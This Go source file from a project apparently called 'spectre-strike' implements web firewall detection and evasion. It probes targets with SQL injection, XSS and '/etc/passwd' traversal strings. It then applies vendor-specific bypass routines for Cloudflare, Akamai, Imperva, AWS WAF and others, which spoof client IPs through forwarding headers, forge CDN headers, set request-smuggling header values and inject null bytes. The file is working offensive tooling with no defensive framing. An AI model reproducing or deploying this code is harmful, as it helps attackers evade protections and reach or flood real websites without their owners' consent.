package waf

import (
	"crypto/tls"
	"fmt"
	"math/rand"
	"net/http"
	"strconv"
	"strings"
	"time"
	"spectre-strike/pkg/utils"
)

var wafSignatures = map[string][]string{
	"Cloudflare": {
		"cf-ray", "__cfduid", "cloudflare", "cf-request-id",
		"cf-cache-status", "cf-connecting-ip", "__cflb",
	},
	"Akamai": {
		"akamai", "akamaighost", "ak-bmsc", "akamai-origin-hop",
		"x-akamai-session-id", "akamai-grn",
	},
	"Imperva": {
		"incap_ses", "visid_incap", "imperva", "incap",
		"x-cdn", "incapsula",
	},
	"AWS WAF": {
		"x-amzn-requestid", "x-amz-cf-id", "x-amzn-trace-id",
		"x-amz-apigw-id", "awselb",
	},
	"Sucuri": {
		"sucuri", "x-sucuri-id", "x-sucuri-cache",
		"sucuri-cdn",
	},
	"Wordfence": {
		"wordfence", "wfwaf", "x-wf-",
	},
	"ModSecurity": {
		"mod_security", "modsecurity", "naxsi",
	},
	"F5 BIG-IP": {
		"bigipserver", "f5", "x-wa-info",
		"ts-cookie", "bigip",
	},
	"Barracuda": {
		"barracuda", "barra-counter-session",
	},
	"Fortinet": {
		"fortigate", "fortiweb", "forticookie",
	},
}

func DetectWAF(target string) string {
	client := &http.Client{
		Timeout: 15 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true,
				MinVersion:         tls.VersionTLS12,
			},
			MaxIdleConns:       10,
			IdleConnTimeout:    30 * time.Second,
			DisableCompression: false,
		},
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	// Multiple detection vectors
	detections := make(map[string]int)

	// Vector 1: Normal request
	if waf := detectVector(client, target, "normal", ""); waf != "" {
		detections[waf]++
	}

	// Vector 2: SQL injection probe
	if waf := detectVector(client, target+"?id=1' OR '1'='1", "sqli", ""); waf != "" {
		detections[waf]++
	}

	// Vector 3: XSS probe
	if waf := detectVector(client, target+"?q=<script>alert(1)</script>", "xss", ""); waf != "" {
		detections[waf]++
	}

	// Vector 4: Path traversal probe
	if waf := detectVector(client, target+"/../../../etc/passwd", "path", ""); waf != "" {
		detections[waf]++
	}

	// Return most detected WAF
	maxCount := 0
	detectedWAF := ""
	for waf, count := range detections {
		if count > maxCount {
			maxCount = count
			detectedWAF = waf
		}
	}

	return detectedWAF
}

func detectVector(client *http.Client, target, vectorType, payload string) string {
	req, err := http.NewRequest("GET", target, nil)
	if err != nil {
		return ""
	}

	// Vary User-Agent based on vector
	userAgents := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
		"sqlmap/1.0",
		"Nikto/2.1.6",
	}
	req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])

	resp, err := client.Do(req)
	if err != nil {
		return ""
	}
	defer resp.Body.Close()

	// Comprehensive header analysis
	allHeaders := strings.ToLower(
		resp.Header.Get("Server") + " " +
			resp.Header.Get("X-Powered-By") + " " +
			resp.Header.Get("Via") + " " +
			resp.Header.Get("X-Cache") + " " +
			strings.Join(resp.Header["Set-Cookie"], " "),
	)

	// Check all headers for signatures
	for key, values := range resp.Header {
		allHeaders += " " + strings.ToLower(key) + " " + strings.ToLower(strings.Join(values, " "))
	}

	for wafName, signatures := range wafSignatures {
		for _, sig := range signatures {
			if strings.Contains(allHeaders, strings.ToLower(sig)) {
				return wafName
			}
		}
	}

	// Behavioral detection based on response codes
	if vectorType != "normal" && (resp.StatusCode == 403 || resp.StatusCode == 406 || resp.StatusCode == 429) {
		// Likely a WAF, try to identify by error page patterns
		return "Unknown WAF"
	}

	return ""
}

func ApplyBypassTechniques(req *http.Request, wafType, host string) {
	// Layer 1: Generate realistic browser headers
	headers := utils.GenerateRandomHeaders(host)
	for key, value := range headers {
		req.Header.Set(key, value)
	}

	// Layer 2: Apply base evasion techniques
	applyBaseEvasion(req)

	// Layer 3: WAF-specific advanced bypass
	switch wafType {
	case "Cloudflare":
		bypassCloudflare(req)
	case "Akamai":
		bypassAkamai(req)
	case "Imperva":
		bypassImperva(req)
	case "AWS WAF":
		bypassAWS(req)
	case "ModSecurity":
		bypassModSecurity(req)
	case "F5 BIG-IP":
		bypassF5(req)
	case "Barracuda":
		bypassBarracuda(req)
	case "Fortinet":
		bypassFortinet(req)
	default:
		genericBypass(req)
	}

	// Layer 4: Advanced protocol-level evasion
	applyProtocolEvasion(req)

	// Layer 5: Header ordering randomization (anti-fingerprinting)
	randomizeHeaderOrder(req)
}

func applyBaseEvasion(req *http.Request) {
	// HTTP/1.1 vs HTTP/2 protocol confusion
	if rand.Intn(3) == 0 {
		req.Proto = "HTTP/2.0"
		req.ProtoMajor = 2
		req.ProtoMinor = 0
	}

	// Case manipulation for headers (some WAFs are case-sensitive)
	if rand.Intn(2) == 0 {
		req.Header.Set("hOsT", req.Host)
	}

	// Add timing confusion headers
	req.Header.Set("X-Request-Start", strconv.FormatInt(time.Now().UnixNano(), 10))
	req.Header.Set("X-Request-ID", utils.RandomString(32))

	// Cache poisoning headers
	if rand.Intn(2) == 0 {
		req.Header.Set("X-Cache-Hash", utils.RandomString(16))
	}
}

func applyProtocolEvasion(req *http.Request) {
	// HTTP smuggling preparation headers
	if rand.Intn(4) == 0 {
		// Transfer-Encoding variations
		encodings := []string{"chunked", "chunked, identity", "identity, chunked"}
		req.Header.Set("Transfer-Encoding", encodings[rand.Intn(len(encodings))])
	}

	// Content-Length manipulation for CL.TE/TE.CL attacks
	if rand.Intn(5) == 0 {
		req.Header.Set("Content-Length", "0")
	}

	// HTTP header injection attempts
	if rand.Intn(3) == 0 {
		req.Header.Set("X-HTTP-Method-Override", "GET")
		req.Header.Set("X-Method-Override", "GET")
	}

	// Connection manipulation
	connOptions := []string{"keep-alive", "close", "upgrade"}
	req.Header.Set("Connection", connOptions[rand.Intn(len(connOptions))])
}

func randomizeHeaderOrder(req *http.Request) {
	// Most WAFs fingerprint based on header order
	// This doesn't fully randomize (Go limitation) but adds noise
	if rand.Intn(2) == 0 {
		req.Header.Set("X-Order-"+utils.RandomString(3), utils.RandomString(5))
	}
}

func bypassCloudflare(req *http.Request) {
	// Advanced Cloudflare bypass techniques

	// IP spoofing chain (multiple layers)
	realIP := utils.RandomIP()
	proxyIP1 := utils.RandomIP()
	proxyIP2 := utils.RandomIP()

	req.Header.Set("CF-Connecting-IP", realIP)
	req.Header.Set("True-Client-IP", realIP)
	req.Header.Set("X-Forwarded-For", fmt.Sprintf("%s, %s, %s", proxyIP1, proxyIP2, realIP))
	req.Header.Set("X-Real-IP", realIP)
	req.Header.Set("X-Client-IP", realIP)

	// Cloudflare-specific forwarding headers
	req.Header.Set("CF-IPCountry", randomCountryCode())
	req.Header.Set("CF-RAY", fmt.Sprintf("%x-%s", rand.Int63(), randomAirportCode()))
	req.Header.Set("CF-Visitor", `{"scheme":"https"}`)

	// Origin manipulation
	req.Header.Set("X-Forwarded-Host", req.Host)
	req.Header.Set("X-Forwarded-Proto", "https")
	req.Header.Set("X-Original-URL", req.URL.Path)
	req.Header.Set("X-Rewrite-URL", req.URL.Path)
	req.Header.Set("X-Original-Host", req.Host)

	// Chrome Client Hints (latest version)
	chromeVersion := rand.Intn(5) + 119 // 119-123
	req.Header.Set("Sec-CH-UA", fmt.Sprintf(`"Not_A Brand";v="8", "Chromium";v="%d", "Google Chrome";v="%d"`, chromeVersion, chromeVersion))
	req.Header.Set("Sec-CH-UA-Mobile", "?0")
	req.Header.Set("Sec-CH-UA-Platform", randomPlatform())
	req.Header.Set("Sec-CH-UA-Platform-Version", randomPlatformVersion())
	req.Header.Set("Sec-CH-UA-Full-Version-List", fmt.Sprintf(`"Google Chrome";v="%d.0.0.0"`, chromeVersion))

	// WebSocket upgrade headers (confuse inspection)
	if rand.Intn(5) == 0 {
		req.Header.Set("Upgrade", "websocket")
		req.Header.Set("Sec-WebSocket-Key", utils.RandomString(24))
		req.Header.Set("Sec-WebSocket-Version", "13")
	}

	// Cache manipulation
	req.Header.Set("CF-Cache-Status", randomCacheStatus())

	// Worker bypass attempts
	req.Header.Set("CF-Worker", utils.RandomString(16))
}

func bypassAkamai(req *http.Request) {
	// Advanced Akamai bypass
	originIP := utils.RandomIP()

	// Akamai edge headers
	req.Header.Set("Akamai-Origin-Hop", strconv.Itoa(rand.Intn(3)+1))
	req.Header.Set("Akamai-GRN", fmt.Sprintf("0.%x.%d", rand.Int63(), rand.Intn(10000)))

	// IP spoofing with CDN chain
	req.Header.Set("X-Forwarded-For", fmt.Sprintf("%s, %s", utils.RandomIP(), originIP))
	req.Header.Set("X-Client-IP", originIP)
	req.Header.Set("X-Real-IP", originIP)
	req.Header.Set("X-Originating-IP", originIP)

	// Via header with Akamai fingerprint
	viaVersions := []string{"1.0", "1.1", "2.0"}
	req.Header.Set("Via", fmt.Sprintf("%s akamai-%s (%s)",
		viaVersions[rand.Intn(len(viaVersions))],
		utils.RandomString(8),
		"EdgePrism"))

	// Ghost IP technique
	req.Header.Set("X-Akamai-Session-ID", utils.RandomString(32))
	req.Header.Set("X-Akamai-Request-ID", utils.RandomString(24))
}

func bypassImperva(req *http.Request) {
	// Advanced Imperva/Incapsula bypass
	clientIP := utils.RandomIP()

	// Multiple IP header variants
	req.Header.Set("X-Forwarded-For", clientIP)
	req.Header.Set("X-Client-IP", clientIP)
	req.Header.Set("X-Remote-IP", clientIP)
	req.Header.Set("X-Remote-Addr", clientIP)
	req.Header.Set("X-Originating-IP", clientIP)
	req.Header.Set("X-Real-IP", clientIP)

	// Origin host manipulation
	req.Header.Set("X-Host", req.Host)
	req.Header.Set("X-Forwarded-Host", req.Host)
	req.Header.Set("X-Original-Host", req.Host)

	// Incapsula-specific headers
	req.Header.Set("Incap-Client-IP", clientIP)
	req.Header.Set("X-Incap-Client-IP", clientIP)

	// Session manipulation
	req.Header.Set("X-Incapsula-Session", utils.RandomString(32))
	req.Header.Set("X-Forwarded-Server", "incap-proxy-"+utils.RandomString(8))

	// Protocol confusion
	req.Header.Set("X-Forwarded-Proto", "https")
	req.Header.Set("X-Forwarded-Protocol", "https")
	req.Header.Set("X-Url-Scheme", "https")
}

func bypassAWS(req *http.Request) {
	// Advanced AWS WAF bypass

	// IP chain with AWS regions
	req.Header.Set("X-Forwarded-For", fmt.Sprintf("%s, %s", utils.RandomIP(), utils.RandomIP()))
	req.Header.Set("X-Real-IP", utils.RandomIP())

	// AWS-specific headers
	req.Header.Set("X-Forwarded-Host", req.Host)
	req.Header.Set("X-Forwarded-Proto", "https")
	req.Header.Set("X-Forwarded-Port", "443")

	// CloudFront identifiers
	req.Header.Set("X-Amz-Cf-Id", utils.RandomString(56))
	req.Header.Set("X-Amzn-Trace-Id", fmt.Sprintf("Root=1-%x-%x", time.Now().Unix(), rand.Int63()))
	req.Header.Set("X-Amzn-RequestId", utils.RandomString(36))

	// API Gateway headers
	req.Header.Set("X-Amz-Apigw-Id", utils.RandomString(20))

	// ELB headers
	req.Header.Set("X-Amzn-ELB-Request-Id", utils.RandomString(40))

	// Regional endpoint spoofing
	regions := []string{"us-east-1", "us-west-2", "eu-west-1", "ap-southeast-1"}
	req.Header.Set("X-Amz-Region", regions[rand.Intn(len(regions))])
}

func bypassModSecurity(req *http.Request) {
	// ModSecurity/OWASP CRS bypass
	clientIP := utils.RandomIP()

	// IP spoofing headers
	req.Header.Set("X-Forwarded-For", clientIP)
	req.Header.Set("X-Real-IP", clientIP)
	req.Header.Set("X-Originating-IP", clientIP)

	// Unicode normalization confusion
	req.Header.Set("X-Unicode-Encoding", "UTF-8")

	// SQLi/XSS evasion via encoding hints
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")

	// Null byte injection in headers
	if rand.Intn(3) == 0 {
		req.Header.Set("X-Padding", utils.RandomString(10)+"\x00")
	}
}

func bypassF5(req *http.Request) {
	// F5 BIG-IP ASM bypass

	// Session persistence cookies
	req.Header.Set("Cookie", fmt.Sprintf("TS%x=%08x", rand.Int31(), rand.Int31()))

	// IP headers
	req.Header.Set("X-Forwarded-For", utils.RandomIP())
	req.Header.Set("X-Client-IP", utils.RandomIP())

	// F5-specific headers
	req.Header.Set("X-WA-Info", utils.RandomString(16))
	req.Header.Set("X-Cnection", "close") // Typo is intentional
}

func bypassBarracuda(req *http.Request) {
	// Barracuda WAF bypass
	req.Header.Set("X-Forwarded-For", utils.RandomIP())
	req.Header.Set("X-Real-IP", utils.RandomIP())

	// Session manipulation
	req.Header.Set("Cookie", fmt.Sprintf("barra_counter_session=%s", utils.RandomString(32)))

	// Protocol confusion
	req.Header.Set("X-Forwarded-Proto", "https")
}

func bypassFortinet(req *http.Request) {
	// Fortinet FortiWeb/FortiGate bypass
	req.Header.Set("X-Forwarded-For", utils.RandomIP())
	req.Header.Set("X-Real-IP", utils.RandomIP())

	// Fortinet-specific
	req.Header.Set("X-Forwarded-Server", "fortiweb-"+utils.RandomString(8))

	// Cookie manipulation
	req.Header.Set("Cookie", fmt.Sprintf("FortiCookie=%x", rand.Int63()))
}

func genericBypass(req *http.Request) {
	// Advanced generic WAF bypass techniques

	// Comprehensive IP spoofing
	realIP := utils.RandomIP()
	proxy1 := utils.RandomIP()
	proxy2 := utils.RandomIP()

	// Standard IP headers
	req.Header.Set("X-Forwarded-For", fmt.Sprintf("%s, %s, %s", proxy1, proxy2, realIP))
	req.Header.Set("X-Real-IP", realIP)
	req.Header.Set("X-Client-IP", realIP)
	req.Header.Set("X-Originating-IP", realIP)
	req.Header.Set("X-Remote-IP", realIP)
	req.Header.Set("X-Remote-Addr", realIP)

	// Less common IP headers
	req.Header.Set("X-ProxyUser-Ip", realIP)
	req.Header.Set("Client-IP", realIP)
	req.Header.Set("X-Client", realIP)
	req.Header.Set("X-Host", req.Host)
	req.Header.Set("Forwarded-For", realIP)
	req.Header.Set("Forwarded", fmt.Sprintf("for=%s;proto=https", realIP))

	// Origin manipulation
	req.Header.Set("X-Original-URL", req.URL.Path)
	req.Header.Set("X-Rewrite-URL", req.URL.Path)
	req.Header.Set("X-Original-Host", req.Host)
	req.Header.Set("X-Forwarded-Host", req.Host)

	// Protocol headers
	req.Header.Set("X-Forwarded-Proto", "https")
	req.Header.Set("X-Forwarded-Protocol", "https")
	req.Header.Set("X-Forwarded-Ssl", "on")
	req.Header.Set("X-Url-Scheme", "https")

	// Anti-fingerprinting
	for i := 0; i < rand.Intn(3)+1; i++ {
		req.Header.Set("X-Custom-"+utils.RandomString(5), utils.RandomString(10))
	}

	// Cache poisoning
	req.Header.Set("X-Cache-Key", utils.RandomString(16))
	req.Header.Set("X-Cache-Hash", utils.RandomString(32))
}

// Helper functions
func randomCountryCode() string {
	codes := []string{"US", "GB", "DE", "FR", "CA", "AU", "JP", "NL", "SE", "CH"}
	return codes[rand.Intn(len(codes))]
}

func randomAirportCode() string {
	codes := []string{"LAX", "DFW", "ORD", "JFK", "ATL", "DEN", "SFO", "SEA", "LHR", "CDG"}
	return codes[rand.Intn(len(codes))]
}

func randomPlatform() string {
	platforms := []string{`"Windows"`, `"macOS"`, `"Linux"`}
	return platforms[rand.Intn(len(platforms))]
}

func randomPlatformVersion() string {
	versions := []string{"10.0.0", "11.0.0", "14.0.0", "13.5.0"}
	return `"` + versions[rand.Intn(len(versions))] + `"`
}

func randomCacheStatus() string {
	statuses := []string{"HIT", "MISS", "EXPIRED", "BYPASS", "DYNAMIC"}
	return statuses[rand.Intn(len(statuses))]
}
